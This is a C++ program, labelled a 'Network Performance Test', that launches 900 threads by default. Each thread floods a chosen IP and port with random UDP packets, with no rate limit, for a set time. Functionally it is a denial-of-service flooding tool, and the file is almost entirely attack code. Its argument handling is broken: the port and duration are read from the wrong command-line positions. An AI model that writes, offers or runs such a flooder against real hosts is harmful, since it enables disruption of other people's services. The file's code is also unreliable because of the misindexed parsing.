#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <atomic>
#include <csignal>
#include <random>
#include <cstring>
#include <cstdlib>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

constexpr int DEFAULT_PAYLOAD_SIZE = 25;
constexpr int DEFAULT_THREADS = 900;

std::atomic<bool> stop_flag(false);
std::atomic<uint64_t> packets_sent(0);
std::atomic<uint64_t> errors(0);

struct TestConfig {
    std::string ip;
    int port = 0;
    int duration = 0;
    int payload_size = DEFAULT_PAYLOAD_SIZE;
    int threads = DEFAULT_THREADS;
};

// Signal handler for safe shutdown
void handle_signal(int) {
    stop_flag = true;
    std::cout << "\n[!] Signal received. Graceful shutdown initiated...\n";
}

// IP address validation
bool is_valid_ip(const std::string& ip) {
    sockaddr_in sa;
    return inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr)) == 1;
}

// Random payload generator (thread-safe)
void generate_payload(std::string& buf, size_t size, std::mt19937& rng) {
    static constexpr char charset[] =
        "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()";
    buf.resize(size);
    std::uniform_int_distribution<size_t> dist(0, sizeof(charset) - 2);
    for (size_t i = 0; i < size; ++i) { buf[i] = charset[dist(rng)]; }
}

// UDP send loop (no rate limit)
void udp_test(const TestConfig& config) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) { errors++; return; }

    sockaddr_in target_addr = {};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(static_cast<uint16_t>(config.port));
    target_addr.sin_addr.s_addr = inet_addr(config.ip.c_str());

    std::random_device rd;
    std::mt19937 rng(rd());
    std::string payload;
    generate_payload(payload, config.payload_size, rng);

    auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);

    while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
        ssize_t sent = sendto(sock, payload.c_str(), payload.size(), 0,
                              reinterpret_cast<sockaddr*>(&target_addr), sizeof(target_addr));
        if (sent > 0) packets_sent++;
        else errors++;
        // No sleeping—send as fast as possible
    }
    close(sock);
}

int main(int argc, char* argv[]) {
    std::signal(SIGINT, handle_signal);

    if (argc < 4 || argc > 6) {
        std::cout << "Usage: ./m <ip> <port> <duration_sec> [payload_size] [threads]\n";
        std::cout << "Defaults: payload_size=" << DEFAULT_PAYLOAD_SIZE
                  << " threads=" << DEFAULT_THREADS << "\n";
        return EXIT_FAILURE;
    }

    TestConfig cfg;
    cfg.ip = argv[1];
    cfg.port = std::stoi(argv[1]);
    cfg.duration = std::stoi(argv[2]);
    if (argc >= 5) cfg.payload_size = std::stoi(argv[3]);
    if (argc == 6) cfg.threads = std::stoi(argv[4]);

    if (!is_valid_ip(cfg.ip)) {
        std::cerr << "[!] Invalid IP address.\n";
        return EXIT_FAILURE;
    }

    std::cout << "====================================\n";
    std::cout << "      Network Performance Test      \n";
    std::cout << "====================================\n";
    std::cout << "Target:      " << cfg.ip << ":" << cfg.port << "\n";
    std::cout << "Duration:    " << cfg.duration << " seconds\n";
    std::cout << "Payload:     " << cfg.payload_size << " bytes\n";
    std::cout << "Threads:     " << cfg.threads << "\n";
    std::cout << "====================================\n\n";

    std::vector<std::thread> workers;
    for (int i = 0; i < cfg.threads; ++i) {
        workers.emplace_back(udp_test, cfg);
    }
    for (auto& t : workers) t.join();

    std::cout << "\n[✔] Test finished.\n";
    std::cout << "[*] Packets sent: " << packets_sent.load() << "\n";
    std::cout << "[*] Errors:       " << errors.load() << "\n";
    return EXIT_SUCCESS;
}
